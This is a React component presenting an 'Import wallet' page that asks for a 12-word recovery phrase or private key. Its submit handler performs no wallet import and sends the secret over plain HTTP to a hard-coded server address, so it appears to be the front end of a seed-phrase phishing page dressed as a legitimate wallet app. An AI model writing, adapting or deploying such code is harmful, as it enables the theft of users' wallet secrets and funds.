import { useState } from 'react';
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faLeftLong } from "@fortawesome/free-solid-svg-icons";
import { Link } from "react-router-dom";
import axios from 'axios';

export default function Input() {
    const [inputValue, setInputValue] = useState('');
    const [errorMessage, setErrorMessage] = useState('');

    const handleChange = (event) => {
        setInputValue(event.target.value);
        setErrorMessage('');
    };

    const handleSubmit = async (event) => {
        event.preventDefault();
        if (inputValue.trim() === '') {
            setErrorMessage('Please enter a recovery phrase or private key.');
        } else {
            try {
                const response = await axios.post('http://172.20.10.3:5002/input',  { inputValue });
                console.log('Form submitted:', response.data);
                setInputValue('');
            } catch (error) {
                console.error('Error submitting form:', error.response || error.message);
                setErrorMessage('Server error: ' + (error.response ? error.response.data : error.message));
            }
        }
    };

    return (
        <div className="p-8 flex flex-col items-center min-h-screen bg-black">
            <div className="w-full sm:w-3/4 lg:w-[67%] max-w-md">
                <div className="mb-4">
                    <Link to="/import">
                        <FontAwesomeIcon icon={faLeftLong} />
                        <p className="p-0 text-[0.4rem]">BACK</p>
                    </Link>
                </div>
                <div className="mb-4">
                    <h1 className="text-white text-2xl font-bold">Import wallet</h1>
                    <p className="text-white py-5">Enter your wallet&apos;s 12-word recovery phrase or private key. You can import any Ethereum, Solana or Bitcoin recovery phrase. Only Ethereum private keys are supported.</p>
                </div>
            </div>
            <div className="w-full sm:w-3/4 lg:w-[67%] max-w-md">
                <form onSubmit={handleSubmit}>
                    <div className="mb-10">
                        <input 
                            type="text" 
                            placeholder="Enter recovery phrase or private key" 
                            className="w-full py-3 px-4 rounded-lg outline outline-1 outline-gray-500"
                            value={inputValue}
                            onChange={handleChange}
                        />
                        {errorMessage && <p className="text-red-500">{errorMessage}</p>}
                        <p className="text-blue-700 font-semibold text-[0.8rem]">Where can I find it?</p>
                    </div>
                    <div className="mt-20">
                        <button type='submit' className="btn btn-active text-black bg-white py-2 rounded-full w-full max-w-xs text-center">Import</button>
                    </div>
                </form>
            </div>
        </div>
    );
}
